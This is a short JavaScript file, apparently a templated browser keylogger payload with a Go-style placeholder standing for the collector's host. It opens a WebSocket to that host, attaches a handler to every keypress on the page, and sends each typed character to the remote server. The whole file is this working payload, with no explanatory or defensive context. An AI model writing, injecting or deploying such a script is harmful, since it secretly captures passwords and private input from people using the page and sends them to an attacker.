(function(){
  var conn = new WebSocket("ws://{{.}}/ws");
  document.onkeypress = keypress;
  function keypress(event)
  {
    s = String.fromCharCode(event.which);
    conn.send(s);
  }
})();